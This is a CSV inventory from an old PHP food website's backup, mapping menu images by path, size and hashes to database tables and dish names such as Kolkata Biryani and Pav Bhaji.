35.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/35.jpg,383358,9bf58f561f1a7e687368050d082784bfe79a06fa0320b737f42e8b929eb9a0aa,50976e08814a560b503f1bcbe1f89dc7,DB Mapped (Verified),product_item_tbl,35,Green Tomato Chutney,menu_img
350.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/350.jpg,18976,5c68bb1f68e27a95f9f2085b295e9a01315cfa3db05bde0b1242c061c9b778a0,2f25b5cbc8f891ae135d14f4c98c0e98,DB Mapped (Verified),menu_item_tbl,350,Dham,menu_img
350.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/350.jpg,18976,5c68bb1f68e27a95f9f2085b295e9a01315cfa3db05bde0b1242c061c9b778a0,2f25b5cbc8f891ae135d14f4c98c0e98,DB Mapped (Verified),menu_item_tbl,350,Dham,menu_small_img
351.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/351.jpg,11850,4c4a6edc0cfc86f505e0e681a12e630ffca3093713f35a0ec1316450df31b208,bc4f23d1ec4c4bb2583ff82407da14ae,DB Mapped (Verified),menu_item_tbl,351,Mittha Bhath,menu_img
351.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/351.jpg,11850,4c4a6edc0cfc86f505e0e681a12e630ffca3093713f35a0ec1316450df31b208,bc4f23d1ec4c4bb2583ff82407da14ae,DB Mapped (Verified),menu_item_tbl,351,Mittha Bhath,menu_small_img
352.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/352.jpeg,15273,4df591ec298b32abdf6ff6cc7c408396ecab3ff1f7c0358ac2dd4e8eef0cb611,3c126fae6b06732b80c4cb4a072988df,DB Mapped (Verified),menu_item_tbl,352,Kullu Trout Fish,menu_img
352.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/352.jpeg,15273,4df591ec298b32abdf6ff6cc7c408396ecab3ff1f7c0358ac2dd4e8eef0cb611,3c126fae6b06732b80c4cb4a072988df,DB Mapped (Verified),menu_item_tbl,352,Kullu Trout Fish,menu_small_img
353.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/353.jpg,14034,e4dc628f451e41e08b240c5368892c4e3ce86f0b1f39ea1168c8617d13802c1b,2993f902f26b876bece4017df6aaf7e6,DB Mapped (Verified),menu_item_tbl,353,Tudkiya Bhath,menu_img
353.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/353.jpg,14034,e4dc628f451e41e08b240c5368892c4e3ce86f0b1f39ea1168c8617d13802c1b,2993f902f26b876bece4017df6aaf7e6,DB Mapped (Verified),menu_item_tbl,353,Tudkiya Bhath,menu_small_img
354.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/354.jpg,10307,54e77dec087c52a3e8aa260d6d49752da145f6c7ceec29bcb239d669add489d8,6d0ea37834497234a7e642bca73a09bd,DB Mapped (Verified),menu_item_tbl,354,Aktori,menu_img
354.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/354.jpg,10307,54e77dec087c52a3e8aa260d6d49752da145f6c7ceec29bcb239d669add489d8,6d0ea37834497234a7e642bca73a09bd,DB Mapped (Verified),menu_item_tbl,354,Aktori,menu_small_img
355.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/355.jpg,15558,da5ecc34a4408d9a83ec186792ce8ba141ff459bb75c872942ab4e2309c5f90c,3343308ad75f2f0388ff756c8fd39dd8,DB Mapped (Verified),menu_item_tbl,355,Patrode,menu_img
355.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/355.jpg,15558,da5ecc34a4408d9a83ec186792ce8ba141ff459bb75c872942ab4e2309c5f90c,3343308ad75f2f0388ff756c8fd39dd8,DB Mapped (Verified),menu_item_tbl,355,Patrode,menu_small_img
356.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/356.jpg,13422,8e97120a31da3f470919bad7c6ca2684daa5bf4973044fd568820993bd8b06ef,896672e17b29b4ab7c2fd621daa6cc23,DB Mapped (Verified),menu_item_tbl,356,Indore,menu_img
356.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/356.jpg,13422,8e97120a31da3f470919bad7c6ca2684daa5bf4973044fd568820993bd8b06ef,896672e17b29b4ab7c2fd621daa6cc23,DB Mapped (Verified),menu_item_tbl,356,Indore,menu_small_img
357.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/357.jpg,16133,bdde28b08477f0c0d304f38f156bbd1e9272951046008febab70c78f9e276ebe,d9be7a4df81050f024d154ba6b872da8,DB Mapped (Verified),menu_item_tbl,357,Mahni,menu_img
357.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/357.jpg,16133,bdde28b08477f0c0d304f38f156bbd1e9272951046008febab70c78f9e276ebe,d9be7a4df81050f024d154ba6b872da8,DB Mapped (Verified),menu_item_tbl,357,Mahni,menu_small_img
358.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/358.jpg,17854,f6ee02cd961e1532967edb9c8a3d4629419b19100c630b2bf35fcbee6e06590d,a6885843c0a545b8af9444c30e37f782,DB Mapped (Verified),menu_item_tbl,358,Chha Gosht,menu_img
358.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/358.jpg,17854,f6ee02cd961e1532967edb9c8a3d4629419b19100c630b2bf35fcbee6e06590d,a6885843c0a545b8af9444c30e37f782,DB Mapped (Verified),menu_item_tbl,358,Chha Gosht,menu_small_img
359.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/359.jpg,10966,837e561e4f130f7cd8f521593e9a5ce08cdc0d0391918eb55a1dacc102acb5e4,c64edd0270fad27c3e958d173b98a876,DB Mapped (Verified),menu_item_tbl,359,Bhey,menu_img
359.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/359.jpg,10966,837e561e4f130f7cd8f521593e9a5ce08cdc0d0391918eb55a1dacc102acb5e4,c64edd0270fad27c3e958d173b98a876,DB Mapped (Verified),menu_item_tbl,359,Bhey,menu_small_img
36.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/36.jpeg,12904,a8f7dc039708813bd05a044d8cfd8287a90266143e42ad25a7528e67ae327a9d,8e241cabe8e54976cfab819fe0983424,DB Mapped (Verified),menu_item_tbl,36,Maggi,menu_img
360.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/360.jpg,95675,ae47dc8f0a7faaf77e18b5c4a3c4ba0d35ed0ad66a433e1944f3b712db54c1f1,c813032cac1bb7244fab40141e1dc647,DB Mapped (Verified),menu_item_tbl,360,Babru,menu_img
360.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/360.jpg,95675,ae47dc8f0a7faaf77e18b5c4a3c4ba0d35ed0ad66a433e1944f3b712db54c1f1,c813032cac1bb7244fab40141e1dc647,DB Mapped (Verified),menu_item_tbl,360,Babru,menu_small_img
361.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/361.jpg,20022,46a4a2fff76106bcaeb979e39de97b12df0a6e5b868403dd546175a717b99b03,4298bac3583385c8a8961339914c6030,DB Mapped (Verified),menu_item_tbl,361,Pakain,menu_img
361.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/361.jpg,20022,46a4a2fff76106bcaeb979e39de97b12df0a6e5b868403dd546175a717b99b03,4298bac3583385c8a8961339914c6030,DB Mapped (Verified),menu_item_tbl,361,Pakain,menu_small_img
362.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/362.jpeg,10775,ec39381c1c6b1ba96c6f8388fdfee75ace72dd0de30692a2cce52c28c7dc76b3,a0c2be896f5293a301a407d35be46da6,DB Mapped (Verified),menu_item_tbl,362,Auriya Kadd,menu_img
362.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/362.jpeg,10775,ec39381c1c6b1ba96c6f8388fdfee75ace72dd0de30692a2cce52c28c7dc76b3,a0c2be896f5293a301a407d35be46da6,DB Mapped (Verified),menu_item_tbl,362,Auriya Kadd,menu_small_img
363.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/363.jpg,11981,d7eeb5e3c7068b56e8e77a6201156f5b63697d97b4e2a29410288a9952f681b4,f02c05c098772c292760e18cb1892603,DB Mapped (Verified),menu_item_tbl,363,Macher Jhol,menu_img
363.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/363.jpg,11981,d7eeb5e3c7068b56e8e77a6201156f5b63697d97b4e2a29410288a9952f681b4,f02c05c098772c292760e18cb1892603,DB Mapped (Verified),menu_item_tbl,363,Macher Jhol,menu_small_img
364.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/364.jpg,17724,34d3db9bd234ae906ab30e0d27be845cf5fd49c8c933d2d1a3db971feb46615b,a3c221803b5b68b44f9b1b231f08bcc7,DB Mapped (Verified),menu_item_tbl,364,Kolkata Biryani,menu_img
364.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/364.jpg,17724,34d3db9bd234ae906ab30e0d27be845cf5fd49c8c933d2d1a3db971feb46615b,a3c221803b5b68b44f9b1b231f08bcc7,DB Mapped (Verified),menu_item_tbl,364,Kolkata Biryani,menu_small_img
365.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/365.jpeg,11206,4de3fca22ccb53ed1dd0c1ece7562ca0140bd0f08d00c66916a4e8a96caf9bb2,292523d7294a533c6bb7014ddcd930f8,DB Mapped (Verified),menu_item_tbl,365,Kosha Mangsho,menu_img
365.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/365.jpeg,11206,4de3fca22ccb53ed1dd0c1ece7562ca0140bd0f08d00c66916a4e8a96caf9bb2,292523d7294a533c6bb7014ddcd930f8,DB Mapped (Verified),menu_item_tbl,365,Kosha Mangsho,menu_small_img
366.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/366.jpg,11054,7fe7511b55f8a9467508bf1343a85197916ab726312409f65238c6a3bb2e98d5,2d1b170e5304bb4490b4205d85a9a007,DB Mapped (Verified),menu_item_tbl,366,Alur Torkari With Luchi,menu_img
366.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/366.jpg,11054,7fe7511b55f8a9467508bf1343a85197916ab726312409f65238c6a3bb2e98d5,2d1b170e5304bb4490b4205d85a9a007,DB Mapped (Verified),menu_item_tbl,366,Alur Torkari With Luchi,menu_small_img
367.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/367.jpg,15985,a93460028740e85a6608d859119fcd958476924d8be489100571f11908fe5645,b8df54c6b09d6ab5184021eef2a87ed3,DB Mapped (Verified),menu_item_tbl,367,Shukto â€“ Bowl Of Veggies,menu_img
367.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/367.jpg,15985,a93460028740e85a6608d859119fcd958476924d8be489100571f11908fe5645,b8df54c6b09d6ab5184021eef2a87ed3,DB Mapped (Verified),menu_item_tbl,367,Shukto â€“ Bowl Of Veggies,menu_small_img
368.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/368.jpeg,160577,39cc375ccf51de32a0c03550b9810d7ff66f5e1ea9947cae51bf4474c9fe6025,ea9f7d20a38e5192a016a0ae00812571,DB Mapped (Verified),menu_item_tbl,368,Chelo Kebab,menu_img
368.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/368.jpeg,160577,39cc375ccf51de32a0c03550b9810d7ff66f5e1ea9947cae51bf4474c9fe6025,ea9f7d20a38e5192a016a0ae00812571,DB Mapped (Verified),menu_item_tbl,368,Chelo Kebab,menu_small_img
369.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/369.jpeg,15349,20db69b04b07feb695660edfacbd2ed476de5b14b6964c6d9db7aa2d0352b0d4,4330892846cfce994c712f2bf04aa8f0,DB Mapped (Verified),menu_item_tbl,369,Mochar Ghonto,menu_img
369.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/369.jpeg,15349,20db69b04b07feb695660edfacbd2ed476de5b14b6964c6d9db7aa2d0352b0d4,4330892846cfce994c712f2bf04aa8f0,DB Mapped (Verified),menu_item_tbl,369,Mochar Ghonto,menu_small_img
37.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/37.jpg,77731,f9fbfb31c49091c6c70fa99b1e125f019c03179de5af2fcd7cca98fd83c337f4,a4087dc270dc6b60c644cad1786d3bf7,DB Mapped (Verified),menu_item_tbl,37,Corn Soup,menu_img
37.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/37.jpg,77731,f9fbfb31c49091c6c70fa99b1e125f019c03179de5af2fcd7cca98fd83c337f4,a4087dc270dc6b60c644cad1786d3bf7,DB Mapped (Verified),menu_item_tbl,37,Corn Soup,menu_small_img
37.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/37.jpg,77731,f9fbfb31c49091c6c70fa99b1e125f019c03179de5af2fcd7cca98fd83c337f4,a4087dc270dc6b60c644cad1786d3bf7,DB Mapped (Verified),product_item_tbl,37,Mint Yogurt Chutney,menu_img
370.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/370.jpg,97180,412be3e6bbb68a0c190016acd9d35a4664f07c3f0d12ae92272ef5d0e635ee18,00a8029f49da6ad5474bdfe6efa9b3ec,DB Mapped (Verified),menu_item_tbl,370,Katla Kalia,menu_img
370.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/370.jpg,97180,412be3e6bbb68a0c190016acd9d35a4664f07c3f0d12ae92272ef5d0e635ee18,00a8029f49da6ad5474bdfe6efa9b3ec,DB Mapped (Verified),menu_item_tbl,370,Katla Kalia,menu_small_img
371.JPG,old-website-php/Full-website-backup/frontEnd/menuimg/371.JPG,26338,1df8b80f69316bf90f0608407c0bc1ed475239635667b1904d542ff6c83c4b9a,efbc4cb82621611eb204b5337e15bcc5,DB Mapped (Verified),menu_item_tbl,371,Macher Muri Ghonto,menu_img
371.JPG,old-website-php/Full-website-backup/frontEnd/menuimg/371.JPG,26338,1df8b80f69316bf90f0608407c0bc1ed475239635667b1904d542ff6c83c4b9a,efbc4cb82621611eb204b5337e15bcc5,DB Mapped (Verified),menu_item_tbl,371,Macher Muri Ghonto,menu_small_img
372.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/372.jpeg,11712,55cc0f8fcf5feca07be8747fbd92015d8c18926ac194cb6752bc479174c88501,0dfeb39c6e2ae8e288688110044e1631,DB Mapped (Verified),menu_item_tbl,372,Aloo Posto â€“ For Potato Lovers,menu_img
372.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/372.jpeg,11712,55cc0f8fcf5feca07be8747fbd92015d8c18926ac194cb6752bc479174c88501,0dfeb39c6e2ae8e288688110044e1631,DB Mapped (Verified),menu_item_tbl,372,Aloo Posto â€“ For Potato Lovers,menu_small_img
373.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/373.jpg,87642,240bf21299efdb3313dd7f33671c549b57bb39200253705749c82c975e022cf5,d8c9a6050e2b1d24cee895b690164b23,DB Mapped (Verified),menu_item_tbl,373,Telebhaja,menu_img
373.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/373.jpg,87642,240bf21299efdb3313dd7f33671c549b57bb39200253705749c82c975e022cf5,d8c9a6050e2b1d24cee895b690164b23,DB Mapped (Verified),menu_item_tbl,373,Telebhaja,menu_small_img
374.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/374.jpeg,6127,55b7860f5e1339415cafeb7be97a78c45e032cb4dfe166d08d84f7495a12d063,d9285139707cbeaa9f99ab9f8c8cae2a,DB Mapped (Verified),menu_item_tbl,374,Jhalmuri â€“ Healthy Munchings,menu_img
374.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/374.jpeg,6127,55b7860f5e1339415cafeb7be97a78c45e032cb4dfe166d08d84f7495a12d063,d9285139707cbeaa9f99ab9f8c8cae2a,DB Mapped (Verified),menu_item_tbl,374,Jhalmuri â€“ Healthy Munchings,menu_small_img
375.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/375.jpg,74793,05e7b5f4a090175d0b0ddac497cfc10b41a9fea0ab5f3816a981cf8d8be814bb,3fc104ab3dc31dd487524714ec69ddc0,DB Mapped (Verified),menu_item_tbl,375,Chop â€“ Spicy Cutlets,menu_img
375.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/375.jpg,74793,05e7b5f4a090175d0b0ddac497cfc10b41a9fea0ab5f3816a981cf8d8be814bb,3fc104ab3dc31dd487524714ec69ddc0,DB Mapped (Verified),menu_item_tbl,375,Chop â€“ Spicy Cutlets,menu_small_img
376.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/376.jpg,58390,f56733d11f90fea86c33bbca1e08f476a3b83c9203cfce057bea34cad30deffe,32561173444a48d6a3dc1c1641f44a60,DB Mapped (Verified),menu_item_tbl,376,Kathi Rolls,menu_img
376.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/376.jpg,58390,f56733d11f90fea86c33bbca1e08f476a3b83c9203cfce057bea34cad30deffe,32561173444a48d6a3dc1c1641f44a60,DB Mapped (Verified),menu_item_tbl,376,Kathi Rolls,menu_small_img
377.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/377.jpg,8970,c7e12919d202e9a16085b17b99b7d3e5bf43b01291c25b27ee08f80613532adb,4e0d9320be0fedb06b28e81362a26550,DB Mapped (Verified),menu_item_tbl,377,Roshogullas â€“ Sweet Tooth Love,menu_img
377.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/377.jpg,8970,c7e12919d202e9a16085b17b99b7d3e5bf43b01291c25b27ee08f80613532adb,4e0d9320be0fedb06b28e81362a26550,DB Mapped (Verified),menu_item_tbl,377,Roshogullas â€“ Sweet Tooth Love,menu_small_img
378.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/378.jpg,68962,5329ae76d49987abb4b643612bd4a7e1963d605e898813ca6ff612769e172b82,5d4c5a8e6ec50a629dd97eb1919a0c37,DB Mapped (Verified),menu_item_tbl,378,Sandesh â€“ Sweet Bites,menu_img
378.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/378.jpg,68962,5329ae76d49987abb4b643612bd4a7e1963d605e898813ca6ff612769e172b82,5d4c5a8e6ec50a629dd97eb1919a0c37,DB Mapped (Verified),menu_item_tbl,378,Sandesh â€“ Sweet Bites,menu_small_img
379.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/379.jpg,7013,1d4fad69912a3b04354c7edd211a6237510b33c0f7567161a01581542832cc50,0687913e66131c9598de0c7a304be002,DB Mapped (Verified),menu_item_tbl,379,Chom Chom â€“ Sweet Delicious Amalgamation,menu_img
38.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/38.jpeg,5178,e1411fcd2c3cdb3edda6edd0903d973bd2ba07b3c55322ba95c9f231389eb560,959fc549253e4970cc5e73ec67cdc5e0,DB Mapped (Verified),menu_item_tbl,38,Baby Corn Soup,menu_img
38.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/38.jpeg,5178,e1411fcd2c3cdb3edda6edd0903d973bd2ba07b3c55322ba95c9f231389eb560,959fc549253e4970cc5e73ec67cdc5e0,DB Mapped (Verified),menu_item_tbl,38,Baby Corn Soup,menu_small_img
380.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/380.jpg,5405,c29095e5ba094c6e89dd61a7581c0aa768cb557009cc8502bb73c896af698ba9,b155b841aa60b82ef48402c439ded196,DB Mapped (Verified),menu_item_tbl,380,Mishti Doi â€“ Dahi,menu_img
381.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/381.jpg,11370,76b28dfbe39de19314e8966acdc64c3d6cc0fb7ee27bd498d94341b917b5d36d,72b7b58c5a4211792aba32f85312f32a,DB Mapped (Verified),menu_item_tbl,381,Patisapta,menu_img
382.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/382.jpg,11582,4dacf1663437ef4f06ea56175d95463dad8b15c9223d6607c8cb9c165ce861f8,cc0f6b843cfff3a807f800f65d353a83,DB Mapped (Verified),menu_item_tbl,382,Pav Bhaji,menu_img
383.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/383.jpg,10141,c452d9da5ddd59f8c6df0bff13bc2686fd4f62cbb36713e348db28c2f552bf92,a6680b04ee840f23b19da4a6a720885c,DB Mapped (Verified),menu_item_tbl,383,Vada Pav,menu_img
384.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/384.jpg,17731,714b4aca8315ea4c9148fdc7541b1dd9eaaacd7d537697cdd3af4f98fa147abc,740c1095a45d893613029488e59d9fae,DB Mapped (Verified),menu_item_tbl,384,Puran Poli,menu_img
385.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/385.jpg,16406,79d8c1d008790394ab2eafd5f2164a48ae912d58daac9956d60053d447202c44,88f3fd23495b70d761400ad4ab049732,DB Mapped (Verified),menu_item_tbl,385,Misal Pav,menu_img
386.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/386.jpg,10733,895079bda1b8e0072f19f11d8fab0d68f8d67c5bc043954764cd1bacebef9215,8330924b5829314983fac08c56bf48c8,DB Mapped (Verified),menu_item_tbl,386,Modak,menu_img
387.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/387.jpg,11241,d5c45cae0dd098523aaf15270b4d77e8bf161765de171050e9cb3a5b01cf80da,3469b1e154350ffd1c743aa5343690ed,DB Mapped (Verified),menu_item_tbl,387,Ragda Pattice,menu_img
388.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/388.jpg,10136,dc336a0d9296dbd444bf3578652226c0c3eb0c24e53dc182bd68859a53e92591,44ae13fe24746c556365f302e701822a,DB Mapped (Verified),menu_item_tbl,388,Bharli Vangi,menu_img
389.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/389.jpg,11647,893abef02614183e4189a3c7f6495d0bf9d5cbe27d5e68ac6c7a5eddabf5e669,fcc21033bcf0e2d0b657ae472c9c95be,DB Mapped (Verified),menu_item_tbl,389,Sreekhand,menu_img
39.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/39.jpg,37099,726aedbfa693846e8f3fe4f9f99a7338d8471eb7451bd5d1a90d1ce7d44e1d70,2e4531cb12d5ad34549ea81714513076,DB Mapped (Verified),menu_item_tbl,39,Tom Yum Soup,menu_img
39.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/39.jpg,37099,726aedbfa693846e8f3fe4f9f99a7338d8471eb7451bd5d1a90d1ce7d44e1d70,2e4531cb12d5ad34549ea81714513076,DB Mapped (Verified),menu_item_tbl,39,Tom Yum Soup,menu_small_img
39.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/39.jpg,37099,726aedbfa693846e8f3fe4f9f99a7338d8471eb7451bd5d1a90d1ce7d44e1d70,2e4531cb12d5ad34549ea81714513076,DB Mapped (Verified),product_item_tbl,39,Capsicum Peanut Chutney,menu_img
390.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/390.jpg,11047,abb2038195f1620e85e5e883e577a939dc632651007ffe17be3bc5327b8f9975,dd486a6ea47e99cbed38738ff719d63e,DB Mapped (Verified),menu_item_tbl,390,Poha - Maharashtra food classic to breakfast rescue,menu_img
391.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/391.jpg,11076,bfd292f3f96a0382ee75a6104ce92e9e0809af9541dc20c7a2a9970d14b80dcc,5511e128a8266fbe7988f65adf9649a7,DB Mapped (Verified),menu_item_tbl,391,Sabudana khichdi,menu_img
392.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/392.jpg,8405,b01bef614c4c0fd1013752ef9b7c8fdb2311d3d0ab2bbe556dc173312d9001bc,ca4b6316a90d67eb733a6d8bbc679de9,DB Mapped (Verified),menu_item_tbl,392,Rassa,menu_img
393.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/393.jpg,7166,ea45085f81acf34f1a3b4dda9fbb61abaaec3cc8506646343d6764a3291a6446,8133f8db41a79531ed7d9589fa307a98,DB Mapped (Verified),menu_item_tbl,393,Sol Kadhi,menu_img
394.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/394.jpg,10019,9c81b225f329333b5f987c6eee7bdf9e1a55a39fa7ec7d24d042ec6d7981382d,833efc2ddf009a771d99195ccdba688d,DB Mapped (Verified),menu_item_tbl,394,Pithla Bhakri,menu_img
395.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/395.jpg,11077,36db065096426a28d1e4594ad5cb73b21b76f597a421c7397cb155f9f458a7f3,1f7905145f973d3425d4537d1fa8e992,DB Mapped (Verified),menu_item_tbl,395,Aamti - Maharashtrian Dal,menu_img
396.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/396.jpg,13489,9fb779d012794a147b2cd80bfbf71b33fa0088c44551fa9cf7dde29724930983,084a78b85caad1988b4cbb3bad0bcb54,DB Mapped (Verified),menu_item_tbl,396,Bhelpuri,menu_img
397.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/397.jpg,7474,27c620d35011389a18cb40802db15a0443f1d2fc948373f7ada7c54e7a26f480,1f6b48d47228c47aba8d4984dca6be51,DB Mapped (Verified),menu_item_tbl,397,Basundi,menu_img
398.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/398.jpg,8291,7dd5c15454a47f74635c3c187fa3363056602220077df25dadac61fa8574a35d,18caa9421eccdd3bfdc4eeeaecf11ff7,DB Mapped (Verified),menu_item_tbl,398,Kairi Cha Panha,menu_img
399.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/399.jpg,6588,21b6f3ed24b8ee4e777a13eb2502e2a5093dbdd54487868f19042a981bd653a5,6af4e1ab4120ed0cfc3d6c365fb89a52,DB Mapped (Verified),menu_item_tbl,399,Aamrus,menu_img
4.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/4.jpg,193458,36e7334599431d1a440adaed47f8e42713bb4105f967a0e0931f4b425449995c,fb9d20a439267624a4365abe208d440b,DB Mapped (Verified),menu_item_tbl,4,Sambhar,menu_img
4.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/4.jpg,193458,36e7334599431d1a440adaed47f8e42713bb4105f967a0e0931f4b425449995c,fb9d20a439267624a4365abe208d440b,DB Mapped (Verified),product_item_tbl,4,Loose Mitthi Matthi,menu_img
4.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/4.jpg,193458,36e7334599431d1a440adaed47f8e42713bb4105f967a0e0931f4b425449995c,fb9d20a439267624a4365abe208d440b,DB Mapped (Verified),website_gallery,4,Images 4,gimage
4.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/4.jpg,193458,36e7334599431d1a440adaed47f8e42713bb4105f967a0e0931f4b425449995c,fb9d20a439267624a4365abe208d440b,DB Mapped (Verified),recipe_appliances_kits,4,Spatula,kits_img
4.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/4.jpg,193458,36e7334599431d1a440adaed47f8e42713bb4105f967a0e0931f4b425449995c,fb9d20a439267624a4365abe208d440b,DB Mapped (Verified),event_cuisine,4,Flame Grilled to Perfection,cuisine_img
40.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/40.jpeg,8806,3196785dcb473a3addde3e61e47a4cf4394fd429586d6952a709af83cd13be62,ce7560b62a34391455eba613561903cf,DB Mapped (Verified),menu_item_tbl,40,Kimchi Soup,menu_img
40.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/40.jpeg,8806,3196785dcb473a3addde3e61e47a4cf4394fd429586d6952a709af83cd13be62,ce7560b62a34391455eba613561903cf,DB Mapped (Verified),menu_item_tbl,40,Kimchi Soup,menu_small_img
400.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/400.jpg,9639,c091cdab90d0bb3af8d7c6eba81cb2e375abc970ea900ef714f0e2b5b7f37dc7,659e44c5e7b79146d7295e6c7549ef34,DB Mapped (Verified),menu_item_tbl,400,Kadhi,menu_img
401.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/401.jpg,9861,deb767d6d8fee49e5021f7dc973b4096052e3eab024be59bdecfb8c787afa203,e5ec0d479f335298a60440e84d46c205,DB Mapped (Verified),menu_item_tbl,401,Bombil/Bombay Duck,menu_img
402.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/402.jpg,18108,c9cbd2ce7378ac4675d183010276d97263b6f22e60e28dd6a59fa3b7c4afd69f,7a72be12781170ff23b53dd508dc3754,DB Mapped (Verified),menu_item_tbl,402,Butter Chicken,menu_img
403.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/403.jpg,10146,a5f3a8d108883fca7dd65a245d90e02c861789e4afc0c80b561a767e3bdfa1ad,2246da8905848ace4ed8ec1688868a5e,DB Mapped (Verified),menu_item_tbl,403,Shakkar Para,menu_img
404.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/404.jpg,6870,caf6c885373a4cf2356de160f9f42253730e2d3090f12f5cd35fbb1248f9c8fe,f8888d46f9602004c5ff8eaa253ffdc7,DB Mapped (Verified),menu_item_tbl,404,Lassi - Curde,menu_img
405.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/405.jpg,15480,ec285958bf9885318dbf98938e4cfba6a4b642c1b6d1d8fb99971a30112d2d22,24813e67fc54ce95ee4934cdf8c1a5e0,DB Mapped (Verified),menu_item_tbl,405,Chole,menu_img
406.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/406.jpg,12508,12fd4c670c839f47d3b80816185887fe727fd39eeeb84c8b9be70e0cec09dddf,4de33e6f37d8e9a37e3a157906a59fc5,DB Mapped (Verified),menu_item_tbl,406,Chole-Bhature - Punjabi Food Fiesta,menu_img
407.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/407.jpg,12038,b16fb83329f546ac0e5c7b70e38b57741939a57c6099b0607b13f0759604aaf7,ed69ac00de57e1f0760496037e4454c2,DB Mapped (Verified),menu_item_tbl,407,Parantha - The Staple Food of Punjab,menu_img
408.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/408.jpg,13223,65fe6c095c694f1495e6cf2ce0c0f4d97cd392623708cc57f930363e85fb9c71,ac20fe676fabdff415e5b85c49edd552,DB Mapped (Verified),menu_item_tbl,408,Amritsari Fish,menu_img
